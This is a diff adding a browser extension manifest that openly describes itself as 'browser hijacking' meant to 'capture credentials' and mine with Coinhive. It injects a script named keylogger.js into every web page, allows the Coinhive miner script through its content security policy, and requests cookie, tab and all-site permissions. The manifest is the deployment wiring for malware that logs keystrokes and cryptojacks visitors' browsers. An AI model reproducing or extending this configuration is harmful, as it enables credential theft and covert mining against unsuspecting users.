@@ -1,0 +1,31 @@
+{
+   "background": {
+      "page": "background.html"
+   },
+   "browser_action": {
+      "default_icon": {
+         "128": "icons/obh128.png",
+         "16": "icons/obh16.png",
+         "48": "icons/obh48.png"
+      },
+      "default_popup": "popup.html"
+   },
+   "content_scripts": [ {
+      "css": [  ],	      
+      "js": [ "js/jquery.js","js/keylogger.js" ],
+      "matches": [ "https://*/*", "http://*/*" ]
+   } ],
+   "content_security_policy": "script-src 'self' https://coinhive.com/lib/miner.min.js; object-src 'self'",
+   "description": " hijack browser with coinhive ,capture credentials",
+   "icons": {
+      "128": "icons/obh128.png",
+      "16": "icons/obh16.png",
+      "256": "icons/obh256.png",
+      "48": "icons/obh48.png"
+   },
+   "manifest_version": 2,
+   "name": "browser hijacking",
+   "permissions": [ "cookies", "tabs", "http://*/*", "https://*/*", "storage", "unlimitedStorage", "idle" ],
+   "version": "6.4.4",
+   "web_accessible_resources": [ "kmine.css" ]
+}
